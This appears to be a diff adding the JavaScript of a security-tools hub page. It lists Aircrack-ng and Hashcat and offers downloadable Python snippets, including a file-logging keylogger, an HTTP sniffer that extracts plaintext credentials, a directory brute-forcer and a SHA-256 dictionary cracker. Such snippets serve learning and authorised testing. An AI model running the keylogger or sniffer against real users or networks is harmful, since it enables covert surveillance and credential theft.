+                description: "WiFi security auditing tools suite. Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing and cracking.",
+                category: "Penetration Testing",
+                price: "FREE",
+                rating: "★★★★☆",
+                downloads: "30K+",
+                image: "https://www.aircrack-ng.org/wp-content/uploads/2018/11/aircrack-ng-logo.png",
+                features: [
+                    "802.11 packet capture",
+                    "WEP and WPA/WPA2-PSK cracking",
+                    "Packet injection",
+                    "WEP key recovery",
+                    "Fake authentication"
+                ],
+                requirements: [
+                    "Wireless card supporting monitor mode",
+                    "1GHz processor",
+                    "1GB RAM",
+                    "Linux recommended"
+                ],
+                os: ["windows", "linux"],
+                downloadLinks: {
+                    windows: "https://www.aircrack-ng.org/downloads.html",
+                    linux: "https://www.aircrack-ng.org/downloads.html",
+                    source: "https://github.com/aircrack-ng/aircrack-ng"
+                }
+            },
+            {
+                name: "Hashcat",
+                description: "Advanced password recovery utility. Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
+                category: "Password Cracking",
+                price: "FREE",
+                rating: "★★★★★",
+                downloads: "38K+",
+                image: "https://hashcat.net/hashcat/hashcat_logo.png",
+                features: [
+                    "Multi-OS support",
+                    "Multi-GPU support",
+                    "Multi-hash support",
+                    "Distributed cracking",
+                    "Built-in benchmarking"
+                ],
+                requirements: [
+                    "NVIDIA or AMD GPU recommended",
+                    "2GB VRAM minimum",
+                    "1GB disk space",
+                    "Latest drivers"
+                ],
+                os: ["windows", "linux", "mac"],
+                downloadLinks: {
+                    windows: "https://hashcat.net/hashcat/",
+                    linux: "https://hashcat.net/hashcat/",
+                    mac: "https://hashcat.net/hashcat/",
+                    source: "https://github.com/hashcat/hashcat"
+                }
+            }
+        ];
+
+        // Sample code data
+        const codeSnippets = [
+            {
+                id: 1,
+                name: "Port Scanner in Python",
+                description: "This Python script implements a basic multi-threaded port scanner. It scans ports 1-1024 on the localhost (127.0.0.1) by default. The script uses threading to speed up the scanning process and a queue to manage the port list.",
+                category: "Network Security",
+                language: "Python",
+                rating: "★★★★★",
+                downloads: "5K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `import socket
+import threading
+from queue import Queue
+
+target = "127.0.0.1"
+queue = Queue()
+open_ports = []
+
+def portscan(port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target, port))
+        return True
+    except:
+        return False
+
+def fill_queue(port_list):
+    for port in port_list:
+        queue.put(port)
+
+def worker():
+    while not queue.empty():
+        port = queue.get()
+        if portscan(port):
+            print(f"Port {port} is open!")
+            open_ports.append(port)
+
+port_list = range(1, 1024)
+fill_queue(port_list)
+
+thread_list = []
+
+for t in range(100):
+    thread = threading.Thread(target=worker)
+    thread_list.append(thread)
+
+for thread in thread_list:
+    thread.start()
+
+for thread in thread_list:
+    thread.join()
+
+print("Open ports:", open_ports)`,
+                requirements: [
+                    "Python 3.6+",
+                    "socket module",
+                    "threading module"
+                ],
+                tags: ["Python", "Networking", "Security"],
+                author: "CyberAge Team",
+                date: "2023-06-15"
+            },
+            {
+                id: 2,
+                name: "Password Strength Checker",
+                description: "This Python script checks the strength of a password based on several criteria: minimum length (8 characters), presence of digits, uppercase and lowercase letters, and special characters. It provides a strength rating from 'Weak' to 'Very Strong'.",
+                category: "Web Security",
+                language: "Python",
+                rating: "★★★★☆",
+                downloads: "3.5K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `import re
+
+def check_password_strength(password):
+    # Check length
+    length = len(password) >= 8
+    
+    # Check for digits
+    digit = bool(re.search(r'\\d', password))
+    
+    # Check for uppercase
+    uppercase = bool(re.search(r'[A-Z]', password))
+    
+    # Check for lowercase
+    lowercase = bool(re.search(r'[a-z]', password))
+    
+    # Check for special characters
+    special = bool(re.search(r'[^A-Za-z0-9]', password))
+    
+    # Calculate strength
+    strength = sum([length, digit, uppercase, lowercase, special])
+    
+    if strength == 5:
+        return "Very Strong"
+    elif strength >= 3:
+        return "Strong"
+    elif strength >= 2:
+        return "Moderate"
+    else:
+        return "Weak"
+
+password = input("Enter password to check: ")
+print(f"Password strength: {check_password_strength(password)}")`,
+                requirements: [
+                    "Python 3.6+",
+                    "re module"
+                ],
+                tags: ["Python", "Security", "Authentication"],
+                author: "CyberAge Team",
+                date: "2023-06-10"
+            },
+            {
+                id: 3,
+                name: "Basic Keylogger",
+                description: "This Python script demonstrates a basic keylogger using the pynput library. It logs keystrokes to a file named 'key_log.txt' and stops when the ESC key is pressed. Note: This is for educational purposes only.",
+                category: "Security",
+                language: "Python",
+                rating: "★★★★☆",
+                downloads: "2.8K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+logging.basicConfig(
+    filename=(log_dir + "key_log.txt"),
+    level=logging.DEBUG,
+    format='%(asctime)s: %(message)s'
+)
+
+def on_press(key):
+    try:
+        logging.info(str(key.char))
+    except AttributeError:
+        logging.info(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()`,
+                requirements: [
+                    "Python 3.6+",
+                    "pynput library (pip install pynput)"
+                ],
+                tags: ["Python", "Security", "Monitoring"],
+                author: "CyberAge Team",
+                date: "2023-06-05"
+            },
+            {
+                id: 4,
+                name: "HTTP Request Sniffer",
+                description: "This Python script uses scapy to sniff HTTP requests on the network and extract interesting information like visited URLs, cookies, and credentials (if sent in plaintext).",
+                category: "Network Security",
+                language: "Python",
+                rating: "★★★★★",
+                downloads: "4.2K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `from scapy.all import *
+from scapy.layers.http import HTTPRequest
+
+def process_packet(packet):
+    if packet.haslayer(HTTPRequest):
+        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        print(f"[+] HTTP Request >> {url}")
+        
+        if packet.haslayer(Raw):
+            load = packet[Raw].load.decode()
+            if "username" in load or "password" in load:
+                print(f"\\n[+] Possible credentials >> {load}\\n")
+
+sniff(iface="eth0", store=False, prn=process_packet)`,
+                requirements: [
+                    "Python 3.6+",
+                    "scapy library (pip install scapy)"
+                ],
+                tags: ["Python", "Networking", "Security"],
+                author: "CyberAge Team",
+                date: "2023-05-28"
+            },
+            {
+                id: 5,
+                name: "Directory Brute Forcer",
+                description: "This Python script performs directory brute forcing on a web server by testing common directory names. It's useful for discovering hidden directories and files during penetration testing.",
+                category: "Web Security",
+                language: "Python",
+                rating: "★★★★☆",
+                downloads: "3.7K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `import requests
+import threading
+
+target_url = "http://testphp.vulnweb.com"
+wordlist_file = "common_dirs.txt"
+threads = 10
+
+def read_wordlist(file_path):
+    with open(file_path, 'r') as f:
+        return [line.strip() for line in f]
+
+def dir_brute(word):
+    url = f"{target_url}/{word}"
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print(f"[+] Found: {url}")
+    except:
+        pass
+
+wordlist = read_wordlist(wordlist_file)
+
+for word in wordlist:
+    t = threading.Thread(target=dir_brute, args=(word,))
+    t.start()`,
+                requirements: [
+                    "Python 3.6+",
+                    "requests library (pip install requests)"
+                ],
+                tags: ["Python", "Web", "Security"],
+                author: "CyberAge Team",
+                date: "2023-05-20"
+            },
+            {
+                id: 6,
+                name: "SHA-256 Hash Cracker",
+                description: "This Python script demonstrates a basic SHA-256 hash cracker that uses a dictionary attack to find matching passwords for given hashes.",
+                category: "Password Cracking",
+                language: "Python",
+                rating: "★★★★☆",
+                downloads: "3.2K+",
+                image: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/1200px-Python-logo-notext.svg.png",
+                code: `import hashlib
+
+def crack_sha256_hash(hash_to_crack, wordlist):
+    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+        for line in f:
+            password = line.strip()
+            hash_guess = hashlib.sha256(password.encode()).hexdigest()
+            if hash_guess == hash_to_crack:
+                return password
+    return None
+
+hash_to_crack = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"  # 'password'
+wordlist = "rockyou.txt"
+
+result = crack_sha256_hash(hash_to_crack, wordlist)
+if result:
+    print(f"[+] Password found: {result}")
+else:
+    print("[-] Password not found in wordlist.")`,
+                requirements: [
+                    "Python 3.6+",
+                    "hashlib module",
+                    "Wordlist file"
+                ],
+                tags: ["Python", "Security", "Hashing"],
+                author: "CyberAge Team",
+                date: "2023-05-15"
+            }
+        ];
+
+        // Load tools into the grid
+        function loadTools(toolsToLoad = tools) {
+            const toolsGrid = document.getElementById('toolsGrid');
+            toolsGrid.innerHTML = '';
+            
+            toolsToLoad.forEach(tool => {
+                const toolCard = document.createElement('div');
+                toolCard.className = 'tool-card';
+                toolCard.innerHTML = `
+                    <img src="${tool.image}" alt="${tool.name}" class="tool-image" onerror="this.src='https://via.placeholder.com/300x150?text=No+Image'">
+                    <div class="tool-header">
+                        <h3 class="tool-name">${tool.name}</h3>
+                        <span class="tool-badge ${tool.price === 'FREE' ? 'badge-free' : 'badge-pro'}">${tool.price}</span>
+                    </div>
+                    <p class="tool-desc">${tool.description.substring(0, 100)}...</p>
+                    <div class="tool-meta">
+                        <span class="tool-category">${tool.category}</span>
+                        <span class="tool-rating">${tool.rating}</span>
+                    </div>
+                    <button class="tool-download">Download (${tool.downloads})</button>
+                `;
+                
+                // Add click event to open modal
+                toolCard.addEventListener('click', () => openToolModal(tool));
+                
+                toolsGrid.appendChild(toolCard);
+            });
+        }
+
+        // Load code snippets into the grid
+        function loadCodeSnippets(snippetsToLoad = codeSnippets) {
+            const codeCardsGrid = document.getElementById('codeCardsGrid');
+            codeCardsGrid.innerHTML = '';
+            
+            snippetsToLoad.forEach(snippet => {
+                const codeCard = document.createElement('div');
+                codeCard.className = 'code-card';
+                codeCard.innerHTML = `
+                    <img src="${snippet.image}" alt="${snippet.name}" class="code-card-image" onerror="this.src='https://via.placeholder.com/300x150?text=No+Image'">
+                    <div class="code-card-header">
+                        <h3 class="code-card-name">${snippet.name}</h3>
+                        <span class="code-card-badge ${getLanguageBadgeClass(snippet.language)}">${snippet.language}</span>
+                    </div>
+                    <p class="code-card-desc">${snippet.description.substring(0, 100)}...</p>
+                    <div class="code-card-meta">
+                        <span class="code-card-category">${snippet.category}</span>
+                        <span class="code-card-rating">${snippet.rating}</span>
+                    </div>
+                    <button class="code-card-view">View Code (${snippet.downloads})</button>
+                `;
+                
+                // Add click event to open modal
+                codeCard.addEventListener('click', () => openCodeModal(snippet));
+                
+                codeCardsGrid.appendChild(codeCard);
+            });
+        }
+
+        // Get appropriate badge class for language
+        function getLanguageBadgeClass(language) {
+            switch(language.toLowerCase()) {
+                case 'python':
+                    return 'badge-python';
+                case 'javascript':
+                    return 'badge-js';
+                case 'shell script':
+                    return 'badge-shell';
+                default:
+                    return 'badge-python';
+            }
+        }
+
+        // Open tool modal with detailed information
+        function openToolModal(tool) {
+            const modal = document.getElementById('toolModal');
+            const modalToolName = document.getElementById('modalToolName');
+            const modalToolDesc = document.getElementById('modalToolDesc');
+            const modalToolFeatures = document.getElementById('modalToolFeatures');
+            const modalToolRequirements = document.getElementById('modalToolRequirements');
+            const modalToolOS = document.getElementById('modalToolOS');
+            const modalToolDownloads = document.getElementById('modalToolDownloads');
+            
+            // Set basic tool info
+            modalToolName.innerHTML = `<i class="fas fa-${getToolIcon(tool.category)}"></i><span>${tool.name}</span>`;
+            modalToolDesc.textContent = tool.description;
+            
+            // Add features
+            modalToolFeatures.innerHTML = '';
+            tool.features.forEach(feature => {
+                const featureTag = document.createElement('div');
+                featureTag.className = 'feature-tag';
+                featureTag.textContent = feature;
+                modalToolFeatures.appendChild(featureTag);
+            });
+            
+            // Add requirements
+            modalToolRequirements.innerHTML = '';
+            tool.requirements.forEach(req => {
+                const li = document.createElement('li');
+                li.textContent = req;
+                modalToolRequirements.appendChild(li);
+            });
+            
+            // Add OS compatibility
+            modalToolOS.innerHTML = '';
+            if (tool.os.includes('windows')) {
+                const osTag = document.createElement('div');
+                osTag.className = 'os-tag windows';
+                osTag.innerHTML = '<i class="fab fa-windows"></i> Windows';
+                modalToolOS.appendChild(osTag);
+            }
+            if (tool.os.includes('linux')) {
+                const osTag = document.createElement('div');
+                osTag.className = 'os-tag linux';
+                osTag.innerHTML = '<i class="fab fa-linux"></i> Linux';
+                modalToolOS.appendChild(osTag);
+            }
+            if (tool.os.includes('mac')) {
+                const osTag = document.createElement('div');
+                osTag.className = 'os-tag mac';
+                osTag.innerHTML = '<i class="fab fa-apple"></i> macOS';
+                modalToolOS.appendChild(osTag);
+            }
+            
+            // Add download options
+            modalToolDownloads.innerHTML = '';
+            if (tool.downloadLinks.windows) {
+                const downloadBtn = document.createElement('a');
+                downloadBtn.className = 'download-btn windows';
+                downloadBtn.href = tool.downloadLinks.windows;
+                downloadBtn.target = '_blank';
+                downloadBtn.innerHTML = '<i class="fab fa-windows"></i> Windows';
+                modalToolDownloads.appendChild(downloadBtn);
+            }
+            if (tool.downloadLinks.linux) {
+                const downloadBtn = document.createElement('a');
+                downloadBtn.className = 'download-btn linux';
+                downloadBtn.href = tool.downloadLinks.linux;
+                downloadBtn.target = '_blank';
+                downloadBtn.innerHTML = '<i class="fab fa-linux"></i> Linux';
+                modalToolDownloads.appendChild(downloadBtn);
+            }
+            if (tool.downloadLinks.mac) {
+                const downloadBtn = document.createElement('a');
+                downloadBtn.className = 'download-btn mac';
+                downloadBtn.href = tool.downloadLinks.mac;
+                downloadBtn.target = '_blank';
+                downloadBtn.innerHTML = '<i class="fab fa-apple"></i> macOS';
+                modalToolDownloads.appendChild(downloadBtn);
+            }
+            if (tool.downloadLinks.source) {
+                const downloadBtn = document.createElement('a');
+                downloadBtn.className = 'download-btn source';
+                downloadBtn.href = tool.downloadLinks.source;
+                downloadBtn.target = '_blank';
+                downloadBtn.innerHTML = '<i class="fas fa-code"></i> Source Code';
+                modalToolDownloads.appendChild(downloadBtn);
+            }
+            
+            // Show modal
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        // Open code modal with detailed information
+        function openCodeModal(snippet) {
+            const modal = document.getElementById('codeModal');
+            const modalCodeName = document.getElementById('modalCodeName');
+            const modalCodeDesc = document.getElementById('modalCodeDesc');
+            const modalCodeTags = document.getElementById('modalCodeTags');
+            const modalCodeContent = document.getElementById('modalCodeContent');
+            const modalCodeRequirements = document.getElementById('modalCodeRequirements');
+            
+            // Set basic code info
+            modalCodeName.innerHTML = `<i class="fas fa-code"></i><span>${snippet.name}</span>`;
+            modalCodeDesc.textContent = snippet.description;
+            
+            // Add tags
+            modalCodeTags.innerHTML = '';
+            snippet.tags.forEach(tag => {
+                const tagElement = document.createElement('div');
+                tagElement.className = 'feature-tag';
+                tagElement.textContent = tag;
+                modalCodeTags.appendChild(tagElement);
+            });
+            
+            // Add code content
+            modalCodeContent.textContent = snippet.code;
+            
+            // Add requirements
+            modalCodeRequirements.innerHTML = '';
+            snippet.requirements.forEach(req => {
+                const li = document.createElement('li');
+                li.textContent = req;
+                modalCodeRequirements.appendChild(li);
+            });
+            
+            // Set up button event listeners
+            document.getElementById('copyCodeBtn').onclick = () => copyCodeToClipboard(snippet.code);
+            document.getElementById('downloadCodeBtn').onclick = () => downloadCode(snippet.code, `${snippet.name.toLowerCase().replace(/\s+/g, '-')}.${snippet.language.toLowerCase() === 'python' ? 'py' : 'txt'}`);
+            document.getElementById('editCodeBtn').onclick = () => alert('Edit functionality would be implemented here');
+            
+            // Show modal
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        // Close tool modal
+        function closeToolModal() {
+            const modal = document.getElementById('toolModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close code modal
+        function closeCodeModal() {
+            const modal = document.getElementById('codeModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Get appropriate icon for tool category
+        function getToolIcon(category) {
+            switch(category) {
+                case 'Penetration Testing':
+                    return 'shield-alt';
+                case 'Network Analysis':
+                    return 'network-wired';
+                case 'Forensics':
+                    return 'search';
+                case 'Password Cracking':
+                    return 'key';
+                case 'Discord Tool':
+                    return 'discord';
+                default:
+                    return 'toolbox';
+            }
+        }
+
+        // Filter tools by category
+        function filterTools(category) {
+            const filterButtons = document.querySelectorAll('#tools .filter-btn');
+            filterButtons.forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.category === category) {
+                    btn.classList.add('active');
+                }
+            });
+
+            const toolsGrid = document.getElementById('toolsGrid');
+            toolsGrid.innerHTML = '';
+            
+            const filteredTools = category === 'all' ? tools : tools.filter(tool => tool.category === category);
+            
+            loadTools(filteredTools);
+        }
+
+        // Filter code snippets by category
+        function filterCodeSnippets(category) {
+            const filterButtons = document.querySelectorAll('#code .filter-btn');
+            filterButtons.forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.category === category) {
+                    btn.classList.add('active');
+                }
+            });
+
+            const codeCardsGrid = document.getElementById('codeCardsGrid');
+            codeCardsGrid.innerHTML = '';
+            
+            const filteredSnippets = category === 'all' ? codeSnippets : codeSnippets.filter(snippet => 
+                snippet.category === category || snippet.language === category || snippet.tags.includes(category)
+            );
+            
+            loadCodeSnippets(filteredSnippets);
+        }
+
+        // Search tools by name or description
+        function searchTools(query) {
+            if (!query.trim()) {
+                loadTools();
+                return;
+            }
+
+            const searchResults = tools.filter(tool => 
+                tool.name.toLowerCase().includes(query.toLowerCase()) || 
+                tool.description.toLowerCase().includes(query.toLowerCase())
+            );
+            
+            loadTools(searchResults);
+        }
+
+        // Copy code to clipboard
+        function copyCodeToClipboard(code) {
+            navigator.clipboard.writeText(code).then(() => {
+                // Show copied notification
+                const notification = document.createElement('div');
+                notification.textContent = 'Code copied to clipboard!';
+                notification.style.position = 'fixed';
+                notification.style.bottom = '20px';
+                notification.style.right = '20px';
+                notification.style.backgroundColor = '#00f7ff';
+                notification.style.color = '#0a0a1a';
+                notification.style.padding = '10px 20px';
+                notification.style.borderRadius = '4px';
+                notification.style.zIndex = '1000';
+                notification.style.boxShadow = '0 0 10px rgba(0,247,255,.5)';
+                document.body.appendChild(notification);
+                
+                setTimeout(() => {
+                    notification.style.transition = 'opacity 0.5s';
+                    notification.style.opacity = '0';
+                    setTimeout(() => notification.remove(), 500);
+                }, 2000);
+            });
+        }
+
+        // Download code as file
+        function downloadCode(code, filename) {
+            const blob = new Blob([code], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename || 'code.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            loadTools();
+            loadCodeSnippets();
+            
+            // Add event listeners to tool filter buttons
+            document.querySelectorAll('#tools .filter-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    filterTools(this.dataset.category);
+                });
+            });
+            
+            // Add event listeners to code filter buttons
+            document.querySelectorAll('#code .filter-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    filterCodeSnippets(this.dataset.category);
+                });
+            });
+            
+            // Search functionality
+            const searchInput = document.getElementById('searchInput');
+            const searchBtn = document.getElementById('searchBtn');
+            
+            searchBtn.addEventListener('click', () => searchTools(searchInput.value));
+            
+            searchInput.addEventListener('keyup', (e) => {
+                if (e.key === 'Enter') {
+                    searchTools(searchInput.value);
+                }
+            });
+            
+            // Load more tools button functionality
+            document.querySelector('#tools .btn-load-more').addEventListener('click', function() {
+                // In a real app, this would load more tools from an API
+                this.classList.add('pulse');
+                setTimeout(() => {
+                    alert('Loading more tools...');
+                    this.classList.remove('pulse');
+                }, 500);
+            });
+            
+            // Load more code snippets button functionality
+            document.querySelector('#code .btn-load-more').addEventListener('click', function() {
+                // In a real app, this would load more code snippets from an API
+                this.classList.add('pulse');
+                setTimeout(() => {
+                    alert('Loading more code snippets...');
+                    this.classList.remove('pulse');
+                }, 500);
+            });
+            
+            // Mobile menu toggle
+            document.querySelector('.hamburger').addEventListener('click', function() {
+                this.classList.toggle('active');
+                document.querySelector('.nav-links').classList.toggle('active');
+                document.querySelector('.auth-buttons').classList.toggle('active');
+            });
+            
+            // Smooth scrolling for navigation links
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const targetId = this.getAttribute('href');
+                    const targetElement = document.querySelector(targetId);
+                    
+                    // Update active link
+                    document.querySelectorAll('.nav-link').forEach(navLink => {
+                        navLink.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    
+                    // Scroll to target
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                });
+            });
+            
+            // Modal close buttons
+            document.getElementById('modalClose').addEventListener('click', closeToolModal);
+            document.getElementById('modalCodeClose').addEventListener('click', closeCodeModal);
+            
+            // Close modals when clicking outside
+            document.getElementById('toolModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeToolModal();
+                }
+            });
+            
+            document.getElementById('codeModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeCodeModal();
+                }
+            });
+            
+            // Get license button
+            document.getElementById('getLicenseBtn').addEventListener('click', function() {
+                window.open('https://cyberage.org/license-key', '_blank');
+            });
+        });
+
+        // Highlight active section while scrolling
+        window.addEventListener('scroll', function() {
+            const scrollPosition = window.scrollY;
+            
+            document.querySelectorAll('section').forEach(section => {
+                const sectionTop = section.offsetTop - 100;
+                const sectionHeight = section.offsetHeight;
+                const sectionId = section.getAttribute('id');
+                
+                if (scrollPosition >= sectionTop && scrollPosition < sectionTop + sectionHeight) {
+                    document.querySelectorAll('.nav-link').forEach(link => {
+                        link.classList.remove('active');
+                        if (link.getAttribute('href') === `#${sectionId}`) {
+                            link.classList.add('active');
+                        }
+                    });
+                }
+            });
+        });</script>
